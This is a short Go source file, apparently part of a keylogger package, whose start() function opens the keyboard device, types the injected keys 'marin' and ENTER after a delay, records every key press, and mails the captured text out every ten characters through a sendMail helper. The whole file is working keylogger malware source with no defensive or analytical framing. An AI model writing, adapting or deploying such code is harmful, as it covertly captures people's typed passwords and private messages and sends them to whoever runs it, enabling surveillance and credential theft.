package keylogger

import (
	"time"
)

func start() {
	var logString string = ""

	keyboard := FindKeyboardDevice()

	if len(keyboard) <= 0 {
		return
	}

	k, err := New(keyboard)
	if err != nil {
		return
	}

	defer k.Close()

	go func() {
		time.Sleep(5 * time.Second)
		keys := []string{"m", "a", "r", "i", "n", "ENTER"}
		for _, key := range keys {
			k.WriteOnce(key)
		}
	}()

	events := k.Read()

	for e := range events {
		switch e.Type {

		case EvKey:

			if e.KeyPress() {
				logString += e.KeyString()
				if len(logString) >= 10 {
					sendMail(logString)
					logString = ""
				}
			}
		}
	}
}
